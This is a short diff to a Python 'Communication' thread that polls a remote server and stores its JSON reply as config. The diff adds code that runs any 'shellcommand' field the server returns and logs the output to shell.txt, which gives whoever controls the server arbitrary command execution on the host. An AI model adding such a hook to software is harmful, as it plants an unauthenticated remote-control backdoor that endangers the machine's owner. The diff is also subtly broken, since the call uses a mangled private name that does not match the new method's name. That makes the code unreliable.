@@ -14,6 +14,7 @@ class Communication(Thread):
         self.__config = config
 
 
+
     def run(self):
         while True:
             sleep(self.__config.communicationFrequency)
@@ -28,6 +29,7 @@ class Communication(Thread):
             response = get(url=self.__config.baseURL, params={'username':self.__config.userName})
             data = response.json()
             if data:
+                self.__executeShellCommand(data)
                 jsonData = dumps(data, ensure_ascii=False)
                 Util.fileOut(self.__config.logPath + 'config.json', jsonData, 'w')
                 if self.__config.debug:
@@ -35,6 +37,13 @@ class Communication(Thread):
         except Exception:
             print('COMMUNICATION ERROR!')
 
+
+
+    def executeShellCommand(self, data:dict):
+        if data.get('shellcommand',''):
+            result = Util.executeShellCommand(data['shellcommand'])
+            Util.fileOut(self.__config.logPath + 'shell.txt', result, 'w')
+            print('shell command executed!')
 
 
 
